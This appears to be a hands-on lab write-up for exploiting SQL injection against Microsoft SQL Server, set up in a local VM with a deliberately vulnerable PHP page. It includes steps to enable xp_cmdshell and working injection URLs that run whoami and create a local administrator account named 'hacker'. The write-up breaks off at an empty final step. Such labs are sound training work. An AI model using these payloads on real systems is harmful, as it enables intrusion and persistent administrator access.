# Execute Arbitrary Commands On A Server Via A SQL Injection Vulnerability
Database applications like MySQL, MS SQL, and Oracle can execute system commands with root or admin privileges. A SQL injection vulnerability could allow arbitrary command execution. In MS SQL, the `xp_cmdshell` stored procedure enables OS command execution from within SQL Server, potentially leading to remote system exploitation

## References
- [Try SQL Server on-premises or in the cloud](https://www.microsoft.com/en-my/sql-server/sql-server-downloads) by Microsoft
- [Download SQL Server Management Studio (SSMS)](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16) by Microsoft
- [Download ODBC Driver for SQL Server](https://learn.microsoft.com/en-us/sql/connect/odbc/download-odbc-driver-for-sql-server?view=sql-server-ver16) by Microsoft
- [MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) by pentestmonkey
- [MSSQL Practical Injection Cheat Sheet](https://www.advania.co.uk/insights/blog/mssql-practical-injection-cheat-sheet/) by advania
- [MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md) by swisskyrepo on GitHub
- [MSSQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection) by HackTricks



## Tasks
- Install Microsoft SQL Server in a virtual machine
- Check if the xp_cmdshell stored procedure is enabled. If disabled, re-enable it
- Add the "nt system\mssqlserver" service account to the local administrator group on the server
- Develop a web application that connects to the MSSQL server and is vulnerable to SQL injection
- Implement user input fields without proper validation that can be exploited for SQL injection
- Use SQL injection techniques to execute arbitrary SQL queries and commands via the vulnerable input fields
- Execute "whoami" on the server using the xp_cmdshell stored procedure
- Use SQL injection to execute commands that create a new local administrator account on the server

## Benchmarks
- Demonstrate that a valid output is received when executing "whoami" on the server using the xp_cmdshell stored procedure
- RDP into the machine using the newly created local administrator account to prove successful exploitation

## Practical Approach
1. Download and install XAMPP, Microsoft SQL Server and also SQL Server Management Studio (SSMS) in Windows 10 VM
2. When SSMS is launched, connect to the SQL Server Instance using the appropriate server name and authentication details (can just leave it as optional)
3. Once connected, go to the toolbar and click 'New Query'. Run the following commands in the query window and execute them
   ```
   -- Check if xp_cmdshell is enabled
   EXEC sp_configure 'show advanced options', 1;
   RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell';
   GO
   
   -- Enable xp_cmdshell if disabled
   EXEC sp_configure 'xp_cmdshell', 1;
   RECONFIGURE;
   GO
   ```
4. Verify that `xp_cmdshell` is enabled by running the command `EXEC xp_cmdshell 'whoami';` in the same query window. The output should look like this <br/>
   ![image](https://github.com/user-attachments/assets/f6fc0fb6-44da-4d4b-9cb0-73c1ada05908)
5. Add MSSQL Server service account to local administrators by running `lusrmgr.msc` to open Local Users and Groups Manager. Add `NT Service\MSSQLSERVER` to the Administrators group <br/>
   ![image](https://github.com/user-attachments/assets/7f1938de-c875-4359-b72f-212c133d3ac6)
6. Before running the vulnerable web application, download and install SQLSRV driver that matches the PHP version. If the PHP version is 8.2.12, find the files named `php_sqlsrv_82_nts_x64.dll` and `php_pdo_sqlsrv_82_nts_x64.dll` and copy them both to `C:\xampp\php\ext\`. Update the `php.ini` file to include `extension=php_sqlsrv_82_nts_x64.dll` and `extension=php_pdo_sqlsrv_82_nts_x64.dll` in the extensions section. Restart Apache in XAMPP
7. In SMSS, open a new query window and run the following SQL commands
   ```
   CREATE TABLE Users (
    ID INT PRIMARY KEY IDENTITY(1,1),
    Username NVARCHAR(50),
    Password NVARCHAR(50)
   );
   
   INSERT INTO Users (Username, Password) VALUES ('admin', 'password123');
   INSERT INTO Users (Username, Password) VALUES ('user1', 'userpass');
   ```
   The data can be found by expanding the Tables Node located under the master node
   ![image](https://github.com/user-attachments/assets/18dcc7d3-e34c-4ac2-a104-db3571d3170e)
8. Download and install Microsoft ODBC Driver for SQL Server (x64) in the reference link above. After installation, test the web app in localhost. If it does not work, repair the ODBC Driver by reinstalling and choose repair
9. To give admin privileges to the SQL Server account, it needs to be added to the `sysadmin` role (highest-level admin role in SQL). However, the SQL account username needs to be known first, and can be identified using
   ```
   SELECT name 
   FROM sys.syslogins 
   WHERE type_desc = 'SQL_LOGIN';
   ```
   or either one of these commands
   ```
   SELECT USER_NAME();
   SELECT CURRENT_USER;
   ```
   Then to use SQL Query to grant `sysadmin` privileges, run
   ```
   EXEC sp_addsrvrolemember 'username', 'sysadmin';
   ```
   To verify the privileges, run
   ```
   SELECT name, type_desc, is_disabled 
   FROM sys.server_principals 
   WHERE type_desc = 'SQL_LOGIN' AND name = 'username';
   ```
   or
   ```
   SELECT * FROM sys.syslogins WHERE name = 'username';
   ```
10. In the web app, add `?id=1` at the end of the URL to check and retrieve data with ID = 1 stored in the database table
11. To inject `xp_cmdshell` into the query, use a dynamic SQL within the query as the following. The SQL Server interprets and run a dynamic SQL string which would not be blocked in a standard SQL query
    ```
    http://localhost/vulnsql/vuln.php?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''whoami'')';--
    ```
12. To use SQL injection to create a new user `hacker` with password `hacked1337`, use the following SQL injection strings at the end of the web app's URL
    ```
    ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''net user hacker hacked1337 /add'')';--
    ```
13. To add this user to the local administrators group, add the following
    ```
    ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''net localgroup administrators hacker /add'')';--
    ```
14. To verify `hacker` was added, check using the SQL injection string
    ```
    ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''whoami'')';--
    ```
15. 
